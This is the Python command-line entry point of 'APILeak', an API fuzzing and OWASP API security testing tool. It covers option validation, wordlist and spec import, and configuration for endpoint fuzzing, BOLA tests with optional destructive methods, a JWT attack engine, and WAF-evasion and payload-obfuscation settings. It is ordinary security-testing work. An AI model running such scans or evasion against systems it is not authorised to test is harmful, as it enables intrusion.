#!/usr/bin/env python3
"""
APILeak Main Entry Point
Enterprise-grade API fuzzing and OWASP testing tool
"""

import asyncio
import sys
import json
import copy
import re
from datetime import datetime, timezone
from pathlib import Path
import click
import os
from typing import Optional

from core import APILeakCore, ConfigurationManager, setup_logging
from core import __version__ as APILEAK_VERSION
from core.config import AuthContext, AuthType
from core.logging import get_logger
from utils.jwt_utils import decode_jwt, encode_jwt, print_jwt_info, verify_hmac_secret
from utils.jwt_attack_engine import JWTAttackEngine
from utils.jwt_attack_models import AttackType
from utils.discovery_session import (
    DiscoveryResult,
    DiscoverySession,
    DiscoverySessionError,
    apply_status_filter,
    group_by_status_class,
    parse_status_filter,
    status_code_class,
)
from utils.discovery_checkpoint import (
    DiscoveryCheckpoint,
    DiscoveryCheckpointError,
)
from modules.fuzzing.orchestrator import normalize_extensions
from utils.http_client import parse_resolve
from utils.discovery_export import DiscoveryExportError, write_discovery_export
from utils.discovery_output import (
    DiscoveryOutputError,
    UnsupportedOutputFormatError,
    write_discovery_output,
)
from utils.triage_table import render_triage_table
from utils.discovery_progress import DiscoveryProgress
from utils.discovery_scope import (
    PathScopeError,
    RecursionScopeError,
    StorageStatusError,
    parse_path_scope,
    parse_recursion_scope,
    parse_storage_status_selection,
)
from utils.response_selector import (
    DiscoveryResultEx,
    SelectorError,
    apply_selectors,
    calibrate_soft_404,
    parse_selectors,
)
from utils.spec_import import (
    SpecImportError,
    import_openapi,
    import_postman,
    merge_candidates,
    normalize_candidate_path,
)
from utils.spec_import import _parse_document as _parse_spec_document


def parse_response_codes(response_filter: str) -> list:
    """Parse response code filter string into list of integers"""
    if not response_filter:
        return []
    
    codes = []
    parts = response_filter.split(',')
    
    for part in parts:
        part = part.strip()
        if '-' in part:
            # Range like 200-300
            try:
                start, end = part.split('-')
                codes.extend(range(int(start), int(end) + 1))
            except ValueError:
                click.echo(f"Warning: Invalid range format '{part}', ignoring", err=True)
        else:
            # Single code like 200
            try:
                codes.append(int(part))
            except ValueError:
                click.echo(f"Warning: Invalid response code '{part}', ignoring", err=True)
    
    return sorted(list(set(codes)))  # Remove duplicates and sort


def parse_status_codes(status_filter: str) -> list:
    """Parse status code filter string into list of integers for HTTP output filtering"""
    if not status_filter:
        return []
    
    codes = []
    parts = status_filter.split(',')
    
    for part in parts:
        part = part.strip()
        if '-' in part:
            # Range like 200-300
            try:
                start, end = part.split('-')
                codes.extend(range(int(start), int(end) + 1))
            except ValueError:
                click.echo(f"Warning: Invalid status code range format '{part}', ignoring", err=True)
        else:
            # Single code like 200
            try:
                codes.append(int(part))
            except ValueError:
                click.echo(f"Warning: Invalid status code '{part}', ignoring", err=True)
    
    return sorted(list(set(codes)))  # Remove duplicates and sort


def _validate_depth(ctx, param, value):
    """Click callback: reject a negative --depth, naming the offending value.

    Click's ``type=int`` already rejects non-integers; this guards the lower
    bound so no Endpoint_Discovery runs on an invalid recursion depth
    (Requirement 17.9).
    """
    if value is not None and value < 0:
        raise click.BadParameter(f"--depth must be >= 0 (got {value})")
    return value


def _validate_max_requests(ctx, param, value):
    """Click callback: reject a --max-requests below 1, naming the value.

    ``default=None`` means "no budget"; any supplied value must be a positive
    request budget so discovery cannot be configured with an impossible limit
    (Requirement 18.7).
    """
    if value is not None and value < 1:
        raise click.BadParameter(f"--max-requests must be >= 1 (got {value})")
    return value


def _validate_concurrency(ctx, param, value):
    """Click callback: reject a --concurrency below 1, naming the value.

    ``default=None`` falls back to the built-in concurrency of 50; any supplied
    value must allow at least one in-flight request (Requirement 20.5).
    """
    if value is not None and value < 1:
        raise click.BadParameter(f"--concurrency must be >= 1 (got {value})")
    return value


def _validate_confirm_hits(ctx, param, value):
    """Click callback: reject a --confirm-hits below 1, naming the value.

    Click's ``type=int`` already rejects non-integers; this guards the lower
    bound so no Endpoint_Discovery runs on an invalid Hit_Confirmation count.
    ``default=None`` keeps Hit_Confirmation disabled; any supplied value must
    request at least one confirmation re-request (Requirement 35.7).
    """
    if value is not None and value < 1:
        raise click.BadParameter(f"--confirm-hits must be >= 1 (got {value})")
    return value


def _validate_timeout(ctx, param, value):
    """Click callback: reject a non-positive --timeout, naming the value.

    The Request_Timeout is a per-request upper bound in seconds and must be a
    positive number; ``default=None`` falls back to the config default. Rejecting
    here guarantees no Endpoint_Discovery runs on an invalid timeout
    (Requirement 28.6).
    """
    if value is not None and value <= 0:
        raise click.BadParameter(f"--timeout must be a positive number of seconds (got {value})")
    return value


def _validate_retries(ctx, param, value):
    """Click callback: reject a negative --retries, naming the value.

    Click's ``type=int`` already rejects non-integers; this guards the lower
    bound so the Retry_Limit is never negative. ``default=None`` falls back to
    the config default. Rejecting here guarantees no Endpoint_Discovery runs on
    an invalid retry limit (Requirement 28.7).
    """
    if value is not None and value < 0:
        raise click.BadParameter(f"--retries must be a non-negative integer (got {value})")
    return value


def _assert_readable(path, option_name):
    """Raise click.BadParameter naming the path when it is missing/unreadable.

    Shared by the --client-cert and --ca-bundle validators so an unreadable path
    is rejected before any Endpoint_Discovery runs (Requirement 29.6).
    """
    if not os.path.exists(path):
        raise click.BadParameter(f"{option_name} path does not exist: {path}")
    if not os.path.isfile(path) or not os.access(path, os.R_OK):
        raise click.BadParameter(f"{option_name} path cannot be read: {path}")


def _validate_client_cert(ctx, param, value):
    """Click callback: validate --client-cert and return the parsed value.

    Accepts either a single ``PATH`` (combined cert+key PEM) or a ``cert:key``
    pair. Each referenced path must exist and be readable, otherwise a
    descriptive error names the unreadable path and no Endpoint_Discovery runs
    (Requirement 29.6). Returns either the path string or a ``(cert, key)`` tuple
    suitable for httpx's ``cert`` kwarg (Requirement 29.1).
    """
    if value is None:
        return None
    if ":" in value:
        cert_path, key_path = value.split(":", 1)
        _assert_readable(cert_path, "--client-cert")
        _assert_readable(key_path, "--client-cert key")
        return (cert_path, key_path)
    _assert_readable(value, "--client-cert")
    return value


def _validate_ca_bundle(ctx, param, value):
    """Click callback: validate --ca-bundle path readability before discovery.

    The custom CA bundle path must exist and be readable; otherwise a descriptive
    error names the unreadable path and no Endpoint_Discovery runs (Requirement
    29.6). Returns the path unchanged (Requirement 29.2).
    """
    if value is None:
        return None
    _assert_readable(value, "--ca-bundle")
    return value


def _validate_resolve(ctx, param, value):
    """Click callback: validate --resolve as a host:ip pair before discovery.

    Delegates to ``parse_resolve`` so a value not expressed as ``host:ip`` is
    rejected with a descriptive error naming the value and no Endpoint_Discovery
    runs (Requirement 29.7). Returns the parsed ``(host, ip)`` tuple (Requirement
    29.4).
    """
    if value is None:
        return None
    try:
        return parse_resolve(value)
    except ValueError as exc:
        raise click.BadParameter(str(exc))


def _validate_secret_patterns(ctx, param, value):
    """Click callback: load and validate the --secret-patterns file.

    The file is a JSON object mapping Secret_Pattern names to regular expression
    strings (Requirement 30.6). The path must be readable, parse as a JSON
    object of string -> string entries, and every regex must compile; otherwise
    a descriptive error names the problem and no Endpoint_Discovery runs.
    Returns the parsed name -> regex map, or ``None`` when the option is not
    supplied (the built-in DEFAULT_SECRET_PATTERNS are then used).
    """
    if value is None:
        return None
    _assert_readable(value, "--secret-patterns")
    try:
        with open(value, "r", encoding="utf-8") as handle:
            data = json.load(handle)
    except json.JSONDecodeError as exc:
        raise click.BadParameter(
            f"--secret-patterns file is not valid JSON: {value} ({exc})"
        )
    except OSError as exc:
        raise click.BadParameter(
            f"--secret-patterns file cannot be read: {value} ({exc})"
        )

    if not isinstance(data, dict) or not data:
        raise click.BadParameter(
            f"--secret-patterns file must be a non-empty JSON object mapping "
            f"pattern names to regex strings: {value}"
        )

    patterns = {}
    for name, pattern in data.items():
        if not isinstance(name, str) or not isinstance(pattern, str):
            raise click.BadParameter(
                f"--secret-patterns entries must map a string name to a string "
                f"regex (offending entry: {name!r})"
            )
        try:
            re.compile(pattern)
        except re.error as exc:
            raise click.BadParameter(
                f"--secret-patterns regex for '{name}' is invalid: {exc}"
            )
        patterns[name] = pattern
    return patterns


def resolve_max_depth(cli_depth: Optional[int]) -> int:
    """Resolve the effective recursion depth with documented precedence.

    Precedence: explicit CLI ``--depth`` value > ``APILEAK_MAX_DEPTH`` env var >
    default 3 (Requirements 17.6, 17.7, 17.8).
    """
    if cli_depth is not None:  # CLI wins (17.6)
        return cli_depth
    return int(os.getenv('APILEAK_MAX_DEPTH', '3'))  # env, else default 3 (17.7, 17.8)


def parse_header_options(header):
    """Parse repeatable ``-H``/``--header`` ``Name: Value`` strings into a dict.

    Each value is split on the first colon; the name and value are stripped.
    Later values for the same header name win. The resulting dict is merged into
    ``HeaderFuzzingConfig.custom_headers`` so the headers ride the existing
    custom-header plumbing and are applied to every Discovery_Request
    (Requirement 24.2).
    """
    parsed = {}
    for raw in header or ():
        name, sep, value = raw.partition(':')
        # A missing separator yields a valueless header name; the malformed-value
        # validation lives in the conflict-validation subtask (Requirement 24.6
        # is scoped to --basic-auth).
        parsed[name.strip()] = value.strip() if sep else ''
    return parsed


def parse_basic_auth(basic_auth):
    """Split a ``--basic-auth`` ``user:pass`` value into ``(username, password)``.

    Returns ``None`` when no value is supplied. The colon-separator validation
    (Requirement 24.6) and the ``--jwt`` conflict check (Requirement 24.5) are
    handled by the conflict-validation subtask before any discovery runs; this
    helper only parses an already-accepted value.
    """
    if not basic_auth:
        return None
    username, _, password = basic_auth.partition(':')
    return (username, password)


def parse_auth_context_option(values):
    """Build one :class:`AuthContext` per ``--auth-context`` option value.

    Format: ``user:token[:privilege]`` (Requirement 20.1).

    - Each value is split on ``:`` with ``maxsplit=2`` so a token that itself
      contains ``:`` (e.g. a JWT is dot-delimited, but bearer values may embed
      colons) survives intact in the second segment.
    - When a third ``:privilege`` segment is present, it sets the AuthContext
      ``privilege_level`` (Requirement 20.3); otherwise the privilege defaults
      to ``1``.
    - A value that omits the ``:`` separator between user and token is rejected
      with a descriptive :class:`click.BadParameter` BEFORE any request is
      issued (Requirement 20.5).

    Returns a ``List[AuthContext]`` — one context per supplied value
    (Requirement 20.2). An empty/unspecified ``values`` yields an empty list so
    the caller can preserve the existing single-``--jwt`` behavior
    (Requirements 20.4, 26.2).
    """
    contexts = []
    for value in values or ():
        if ':' not in value:
            raise click.BadParameter(
                f"--auth-context must be in the form user:token[:privilege] "
                f"(got {value!r}): missing ':' separator between user and token."
            )
        parts = value.split(':', 2)
        name, token = parts[0], parts[1]
        privilege_level = 1
        if len(parts) == 3 and parts[2] != '':
            try:
                privilege_level = int(parts[2])
            except ValueError:
                raise click.BadParameter(
                    f"--auth-context privilege suffix must be an integer "
                    f"(got {parts[2]!r} in {value!r})."
                )
        contexts.append(AuthContext(
            name=name,
            type=AuthType.BEARER,
            token=token,
            privilege_level=privilege_level,
        ))
    return contexts


def validate_basic_auth_options(basic_auth, jwt):
    """Validate ``--basic-auth`` against conflicts and malformed values.

    Mirrors :func:`validate_user_agent_options`' exit-before-discovery pattern:
    on a problem it prints a descriptive error to stderr and ``sys.exit(1)`` so
    NO Endpoint_Discovery is performed.

    - ``--basic-auth`` together with ``--jwt`` is rejected as a conflicting set
      of authentication options (Requirement 24.5); they would otherwise fight
      over the single anonymous ``authentication.contexts[0]`` (the standard
      ``if jwt:`` override would clobber the basic context to ``bearer``).
    - A ``--basic-auth`` value without a ``:`` separating the user from the
      password is rejected as malformed (Requirement 24.6).
    """
    if not basic_auth:
        return

    if jwt:
        click.echo(
            "Error: Conflicting authentication options: --basic-auth and --jwt "
            "cannot be used together.",
            err=True,
        )
        sys.exit(1)

    if ':' not in basic_auth:
        click.echo(
            f"Error: Malformed --basic-auth value '{basic_auth}': expected "
            "'user:pass' with a ':' separating the username from the password.",
            err=True,
        )
        sys.exit(1)


def validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file):
    """Validate that only one user agent option is specified"""
    options_count = sum([bool(user_agent_random), bool(user_agent_custom), bool(user_agent_file)])
    
    if options_count > 1:
        click.echo("Error: Only one user agent option can be specified at a time:", err=True)
        click.echo("  --user-agent-random", err=True)
        click.echo("  --user-agent-custom", err=True)
        click.echo("  --user-agent-file", err=True)
        sys.exit(1)
    
    # Validate user agent file exists if specified
    if user_agent_file:
        if not Path(user_agent_file).exists():
            click.echo(f"Error: User agent file not found: {user_agent_file}", err=True)
            sys.exit(1)


def load_user_agents_from_file(file_path):
    """Load user agents from file, filtering out empty lines and comments"""
    try:
        user_agents = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    user_agents.append(line)
        
        if not user_agents:
            click.echo(f"Error: No valid user agents found in file: {file_path}", err=True)
            sys.exit(1)
        
        return user_agents
    except Exception as e:
        click.echo(f"Error reading user agent file {file_path}: {e}", err=True)
        sys.exit(1)


def _read_wordlist_entries(source):
    """Read one ``--wordlist`` source into entries.

    A ``source`` of ``-`` reads entries from standard input; any other value is
    treated as a file path. Blank lines and lines whose first non-whitespace
    character is ``#`` are skipped, using the same rule as ``_load_wordlist`` /
    :func:`load_user_agents_from_file` (Requirement 25.5).
    """
    if source == '-':
        lines = sys.stdin.read().splitlines()
    else:
        with open(source, 'r', encoding='utf-8') as handle:
            lines = handle.readlines()

    entries = []
    for line in lines:
        stripped = line.strip()
        if stripped and not stripped.startswith('#'):
            entries.append(stripped)
    return entries


def _load_spec_seeds(openapi_sources, postman_sources):
    """Parse ``--openapi`` / ``--postman`` sources into Spec_Import seeds.

    OpenAPI/Swagger sources are parsed with :func:`import_openapi` and Postman
    collections with :func:`import_postman` (Requirements 25.1-25.3). An
    unparseable or unrecognized source raises :class:`SpecImportError` naming the
    offending source so the caller can perform no discovery (Requirement 25.6).
    """
    seeds = []
    for path in openapi_sources:
        try:
            doc = _parse_spec_document(path)
            seeds.extend(import_openapi(doc))
        except SpecImportError as exc:
            raise SpecImportError(f"OpenAPI source '{path}': {exc}") from exc
    for path in postman_sources:
        try:
            doc = _parse_spec_document(path)
            seeds.extend(import_postman(doc))
        except SpecImportError as exc:
            raise SpecImportError(f"Postman source '{path}': {exc}") from exc
    return seeds


def _resolve_dir_candidates(wordlists, openapi_sources, postman_sources):
    """Resolve discovery candidates from wordlists and Spec_Import sources.

    Returns a ``(candidate_set, seed_methods, wordlist_path)`` tuple:

    * Backward-compatible single-file case (no spec sources, no stdin, and at
      most one ``--wordlist``): ``candidate_set`` is ``None`` and ``seed_methods``
      is empty, while ``wordlist_path`` is the single file path (or ``None`` for
      the default wordlist). Discovery then loads the file via ``_load_wordlist``
      exactly as before.
    * Otherwise (any spec source, repeated ``--wordlist``, or ``--wordlist -``):
      all wordlist entries and spec seed paths are merged and de-duplicated by
      normalized path via :func:`merge_candidates` into an in-memory
      ``candidate_set`` (possibly empty, Requirement 25.4/25.7/25.8).
      ``seed_methods`` maps each spec seed's normalized path to its declared HTTP
      methods so those methods extend the per-path method set (Requirement 25.3),
      and ``wordlist_path`` is ``None``.

    Raises :class:`SpecImportError` naming an unparseable spec source
    (Requirement 25.6).
    """
    wordlists = list(wordlists or [])
    has_stdin = '-' in wordlists
    has_specs = bool(openapi_sources or postman_sources)

    # Backward-compatible single-file (or default) discovery path.
    if not has_specs and not has_stdin and len(wordlists) <= 1:
        return None, {}, (wordlists[0] if wordlists else None)

    # In-memory merged candidate set mode (Requirements 25.3, 25.4, 25.5).
    spec_seeds = _load_spec_seeds(openapi_sources, postman_sources)

    wordlist_entries = []
    for source in wordlists:
        wordlist_entries.extend(_read_wordlist_entries(source))

    candidate_set = merge_candidates(wordlist_entries, spec_seeds)

    # Spec methods extend the per-path method set for those seeds (Requirement
    # 25.3); keyed by normalized path so the fuzzer can match each candidate.
    seed_methods = {}
    for seed in spec_seeds:
        key = normalize_candidate_path(seed.path)
        if not key:
            continue
        methods = seed_methods.setdefault(key, [])
        if seed.method not in methods:
            methods.append(seed.method)

    return candidate_set, seed_methods, None


def prepare_output_filename(output_param):
    """Prepare output filename, ensuring it goes to reports directory"""
    if not output_param:
        return None
    
    # Extract just the filename, ignore any path components
    filename = Path(output_param).name
    
    # Remove any extension as the system will add appropriate extensions
    if '.' in filename:
        filename = filename.rsplit('.', 1)[0]
    
    return filename


def print_banner():
    """Print APILeak banner"""
    banner = r"""
      .o.       ooooooooo.   ooooo ooooo                            oooo                 
     .888.      `888   `Y88. `888' `888'                            `888                 
    .8"888.      888   .d88'  888   888          .ooooo.   .oooo.    888  oooo   .oooo.o 
   .8' `888.     888ooo88P'   888   888         d88' `88b `P  )88b   888 .8P'   d88(  "8 
  .88ooo8888.    888          888   888         888ooo888  .oP"888   888888.    `"Y88b.  
 .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b 
o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P' 

APILeak v0.1.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
"""
    click.echo(banner, color=True)


def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical", safe_mode=False, extra_headers=None, basic_auth=None, bola_config=None):
    """Create an enhanced configuration with all advanced features integrated"""
    # Support environment variable overrides for CI/CD integration
    target_url = target_url or os.getenv('APILEAK_TARGET', '')
    
    default_wordlists = {
        'endpoints': 'wordlists/endpoints.txt',
        'parameters': 'wordlists/parameters.txt',
        'headers': 'wordlists/headers.txt',
        'jwt_secrets': 'wordlists/jwt_secrets.txt'
    }
    
    # Use provided wordlist or default
    if wordlist_path:
        if scan_type == "dir":
            default_wordlists['endpoints'] = wordlist_path
        elif scan_type == "par":
            default_wordlists['parameters'] = wordlist_path
    
    # Configure user agent settings with environment variable support
    user_agent_settings = {
        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.1.0'),
        'Accept': 'application/json'
    }
    random_user_agent = False
    user_agent_list = None
    user_agent_rotation = False
    
    if user_agent_config:
        if user_agent_config.get('random'):
            random_user_agent = True
        elif user_agent_config.get('custom'):
            user_agent_settings['User-Agent'] = user_agent_config['custom']
        elif user_agent_config.get('file_list'):
            user_agent_list = user_agent_config['file_list']
            user_agent_rotation = True
            # Use first user agent as default
            user_agent_settings['User-Agent'] = user_agent_list[0]
    
    # Merge operator-supplied discovery headers (and the --cookie string, which
    # the caller places under the 'Cookie' key) into the header-fuzzing
    # custom_headers dict so they exist on the engine config and are applied to
    # every Discovery_Request (Requirements 24.2, 24.3).
    if extra_headers:
        user_agent_settings.update(extra_headers)
    
    # Configure enhanced advanced discovery settings
    advanced_discovery_config = {
        'enabled': True,  # Always enable for full integration
        'framework_detection': {
            'enabled': advanced_config.get('detect_framework', False) if advanced_config else False,
            'adapt_payloads': True,
            'test_framework_endpoints': True,
            'max_error_requests': 5,
            'timeout': 10.0,
            'confidence_threshold': advanced_config.get('framework_confidence', 0.6) if advanced_config else 0.6
        },
        'version_fuzzing': {
            'enabled': advanced_config.get('fuzz_versions', False) if advanced_config else False,
            'version_patterns': advanced_config.get('version_patterns', [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
                "/api/1", "/api/2", "/api/3",
                "/1", "/2", "/3"
            ]) if advanced_config else [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5"
            ],
            'test_endpoints': ["/", "/health", "/status", "/info", "/docs"],
            'max_concurrent_requests': 5,
            'timeout': 10.0,
            'compare_endpoints': True,
            'detect_deprecated': True
        },
        'subdomain_discovery': advanced_config.get('enable_subdomain_discovery', False) if advanced_config else False,
        'cors_analysis': advanced_config.get('enable_cors_analysis', False) if advanced_config else False,
        'security_headers': advanced_config.get('enable_cors_analysis', False) if advanced_config else False,
        'waf_detection': {
            'enabled': advanced_config.get('enable_waf_evasion', False) if advanced_config else False,
            'adaptive_throttling': True,
            'evasion_techniques': True
        },
        'payload_encoding': {
            'enabled': advanced_config.get('enable_payload_encoding', False) if advanced_config else False,
            'encodings': ['url', 'base64', 'html', 'unicode'],
            'obfuscation_techniques': ['case_variation', 'mutation']
        }
    }

    # Enhanced OWASP modules configuration
    owasp_modules = [] if scan_type in ["dir", "par"] else [
        module.strip() for module in os.getenv('APILEAK_MODULES', 'bola,auth,property,resource,function_auth,ssrf').split(',')
    ] if os.getenv('APILEAK_MODULES') else [
        "bola", "auth", "property", "resource", "function_auth", "ssrf"
    ]

    # OWASP testing section. Advanced BOLA hardening options (Requirement 34)
    # are threaded into the owasp_testing.bola_testing sub-dict consumed by
    # ConfigurationManager._build_owasp_config -> BOLAConfig(**bola_testing).
    # When ``bola_config`` is None (no advanced BOLA CLI flags) the sub-dict is
    # omitted entirely, so BOLAConfig resolves to its safe read-only defaults
    # and existing behavior is preserved byte-for-byte (Requirements 34.3,
    # 34.4). All boolean flags default to False (their dataclass defaults), and
    # ``destructive_methods`` is only set when the operator explicitly supplies
    # --bola-destructive-methods; otherwise the BOLAConfig default {PATCH, PUT}
    # applies (Requirement 34.2).
    owasp_testing = {
        'enabled_modules': owasp_modules
    }
    if bola_config:
        bola_testing = {
            'allow_destructive': bola_config.get('allow_destructive', False),
            'enable_composite': bola_config.get('enable_composite', False),
            'enable_id_leakage': bola_config.get('enable_id_leakage', False),
            'verb_tampering': bola_config.get('verb_tampering', False),
            'parameter_pollution': bola_config.get('parameter_pollution', False),
            'dry_run': bola_config.get('dry_run', False),
        }
        destructive_methods = bola_config.get('destructive_methods')
        if destructive_methods:
            bola_testing['destructive_methods'] = destructive_methods
        owasp_testing['bola_testing'] = bola_testing

    config = {
        'target': {
            'base_url': target_url,
            'default_method': 'GET',
            'timeout': int(os.getenv('APILEAK_TIMEOUT', '10')),
            'verify_ssl': os.getenv('APILEAK_VERIFY_SSL', 'true').lower() == 'true'
        },
        'fuzzing': {
            'endpoints': {
                'enabled': scan_type in ["full", "dir"],
                'wordlist': default_wordlists['endpoints'],
                'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                'follow_redirects': True,
                'extensions': [],
                'enumerate_methods': False
            },
            'parameters': {
                'enabled': scan_type in ["full", "par"],
                'query_wordlist': default_wordlists['parameters'],
                'body_wordlist': default_wordlists['parameters'],
                'boundary_testing': scan_type == "full"  # Enable for full scans
            },
            'headers': {
                'enabled': scan_type == "full",
                'wordlist': default_wordlists['headers'],
                'custom_headers': user_agent_settings,
                'random_user_agent': random_user_agent,
                'user_agent_list': user_agent_list,
                'user_agent_rotation': user_agent_rotation
            },
            'recursive': True,
            'max_depth': int(os.getenv('APILEAK_MAX_DEPTH', '3')),
            'response_filter': [],
            'max_requests': None,
            'concurrency': 50
        },
        'authentication': {
            'contexts': [
                {
                    'name': 'anonymous',
                    'type': 'bearer',
                    'token': os.getenv('APILEAK_JWT_TOKEN', ''),
                    'privilege_level': 0
                }
            ],
            'default_context': 'anonymous'
        },
        'rate_limiting': {
            'requests_per_second': int(os.getenv('APILEAK_RATE_LIMIT', '10')),
            'burst_size': 20,
            'adaptive': True,
            'respect_retry_after': True,
            'backoff_factor': 2.0
        },
        'reporting': {
            'formats': ['json', 'html', 'txt'],
            'output_dir': os.getenv('APILEAK_OUTPUT_DIR', 'reports'),
            'output_filename': output_filename,
            'include_screenshots': False,
            'template_dir': 'templates'
        },
        'advanced_discovery': advanced_discovery_config,
        'http_output': {
            'status_code_filter': status_code_filter
        },
        'owasp_testing': owasp_testing,
        'ci_cd_integration': {
            'enabled': ci_mode,
            'fail_on_severity': fail_on,
            'generate_artifacts': ci_mode,
            'exit_codes': {
                'critical': 2,
                'high': 1,
                'medium': 0,
                'low': 0
            }
        },
        'secret_scan': {
            # Secret/leak detection is opt-in (Requirement 30.1); the dir/full
            # override block flips 'enabled' and sets 'patterns' when
            # --detect-secrets/--secret-patterns are supplied. Omitting
            # 'patterns' here lets SecretScanConfig fall back to the built-in
            # DEFAULT_SECRET_PATTERNS (Requirement 30.6).
            'enabled': False
        },
        'safe_mode': safe_mode
    }
    
    # Map --basic-auth onto the anonymous auth context as an HTTP Basic context
    # (type='basic' with username/password) so the existing
    # HTTPRequestEngine._apply_authentication branch emits a Basic Authorization
    # header on every Discovery_Request (Requirement 24.4).
    if basic_auth:
        username, password = basic_auth
        config['authentication']['contexts'][0]['type'] = 'basic'
        config['authentication']['contexts'][0]['username'] = username
        config['authentication']['contexts'][0]['password'] = password
    
    # For parameter fuzzing, disable endpoint discovery and use the target directly
    if scan_type == "par":
        config['fuzzing']['endpoints']['enabled'] = False
    
    return config


def create_default_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, extra_headers=None, basic_auth=None):
    """Create a default configuration when no config file is provided (legacy compatibility)"""
    return create_enhanced_config(target_url, wordlist_path, scan_type, user_agent_config, output_filename, advanced_config, status_code_filter, False, "critical", False, extra_headers, basic_auth)
    """Create a default configuration when no config file is provided"""
    # Support environment variable overrides for CI/CD integration
    target_url = target_url or os.getenv('APILEAK_TARGET', '')
    
    default_wordlists = {
        'endpoints': 'wordlists/endpoints.txt',
        'parameters': 'wordlists/parameters.txt',
        'headers': 'wordlists/headers.txt',
        'jwt_secrets': 'wordlists/jwt_secrets.txt'
    }
    
    # Use provided wordlist or default
    if wordlist_path:
        if scan_type == "dir":
            default_wordlists['endpoints'] = wordlist_path
        elif scan_type == "par":
            default_wordlists['parameters'] = wordlist_path
    
    # Configure user agent settings with environment variable support
    user_agent_settings = {
        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.1.0'),
        'Accept': 'application/json'
    }
    random_user_agent = False
    user_agent_list = None
    user_agent_rotation = False
    
    if user_agent_config:
        if user_agent_config.get('random'):
            random_user_agent = True
        elif user_agent_config.get('custom'):
            user_agent_settings['User-Agent'] = user_agent_config['custom']
        elif user_agent_config.get('file_list'):
            user_agent_list = user_agent_config['file_list']
            user_agent_rotation = True
            # Use first user agent as default
            user_agent_settings['User-Agent'] = user_agent_list[0]
    
    # Configure advanced discovery settings
    advanced_discovery_config = {
        'framework_detection': {
            'enabled': advanced_config.get('detect_framework', False) if advanced_config else False,
            'adapt_payloads': True,
            'test_framework_endpoints': True,
            'max_error_requests': 5,
            'timeout': 10.0,
            'confidence_threshold': advanced_config.get('framework_confidence', 0.6) if advanced_config else 0.6
        },
        'version_fuzzing': {
            'enabled': advanced_config.get('fuzz_versions', False) if advanced_config else False,
            'version_patterns': advanced_config.get('version_patterns', [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5",
                "/api/1", "/api/2", "/api/3",
                "/1", "/2", "/3"
            ]) if advanced_config else [
                "/v1", "/v2", "/v3", "/v4", "/v5",
                "/api/v1", "/api/v2", "/api/v3", "/api/v4", "/api/v5"
            ],
            'test_endpoints': ["/", "/health", "/status", "/info", "/docs"],
            'max_concurrent_requests': 5,
            'timeout': 10.0,
            'compare_endpoints': True,
            'detect_deprecated': True
        },
        'subdomain_discovery': {
            'enabled': False  # Keep disabled by default for performance
        },
        'cors_analysis': {
            'enabled': False  # Keep disabled by default for performance
        },
        'security_headers': {
            'enabled': False  # Keep disabled by default for performance
        }
    }

    config = {
        'target': {
            'base_url': target_url,
            'default_method': 'GET',
            'timeout': int(os.getenv('APILEAK_TIMEOUT', '10')),
            'verify_ssl': os.getenv('APILEAK_VERIFY_SSL', 'true').lower() == 'true'
        },
        'fuzzing': {
            'endpoints': {
                'enabled': scan_type in ["full", "dir"],
                'wordlist': default_wordlists['endpoints'],
                'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                'follow_redirects': True,
                'enumerate_methods': False
            },
            'parameters': {
                'enabled': scan_type in ["full", "par"],
                'query_wordlist': default_wordlists['parameters'],
                'body_wordlist': default_wordlists['parameters'],
                'boundary_testing': False  # Disabled by default to avoid excessive requests
            },
            'headers': {
                'enabled': scan_type == "full",
                'wordlist': default_wordlists['headers'],
                'custom_headers': user_agent_settings,
                'random_user_agent': random_user_agent,
                'user_agent_list': user_agent_list,
                'user_agent_rotation': user_agent_rotation
            },
            'recursive': True,
            'max_depth': int(os.getenv('APILEAK_MAX_DEPTH', '3')),
            'response_filter': [],
            'max_requests': None,
            'concurrency': 50
        },
        'owasp_testing': {
            'enabled_modules': [] if scan_type in ["dir", "par"] else [
                module.strip() for module in os.getenv('APILEAK_MODULES', 'bola,auth,property,resource,function_auth,ssrf').split(',')
            ] if os.getenv('APILEAK_MODULES') else [
                "bola", "auth", "property", "resource", "function_auth", "ssrf"
            ]
        },
        'authentication': {
            'contexts': [
                {
                    'name': 'anonymous',
                    'type': 'bearer',
                    'token': os.getenv('APILEAK_JWT_TOKEN', ''),
                    'privilege_level': 0
                }
            ],
            'default_context': 'anonymous'
        },
        'rate_limiting': {
            'requests_per_second': int(os.getenv('APILEAK_RATE_LIMIT', '10')),
            'burst_size': 20,
            'adaptive': True,
            'respect_retry_after': True,
            'backoff_factor': 2.0
        },
        'reporting': {
            'formats': ['json', 'html', 'txt'],
            'output_dir': os.getenv('APILEAK_OUTPUT_DIR', 'reports'),
            'output_filename': output_filename,
            'include_screenshots': False,
            'template_dir': 'templates'
        },
        'advanced_discovery': advanced_discovery_config,
        'http_output': {
            'status_code_filter': status_code_filter  # Filter for HTTP output display
        }
    }
    
    # For parameter fuzzing, disable endpoint discovery and use the target directly
    if scan_type == "par":
        config['fuzzing']['endpoints']['enabled'] = False
    
    return config


@click.group()
@click.option('--no-banner', is_flag=True, help='Suppress banner output')
@click.pass_context
def cli(ctx, no_banner):
    """APILeak v0.1.0 - Enterprise API Fuzzing Tool
    
    \b
    Performs comprehensive security testing of APIs including:
    • Traditional endpoint and parameter fuzzing
    • OWASP API Security Top 10 testing  
    • Advanced vulnerability detection with framework detection
    • Version fuzzing and subdomain discovery
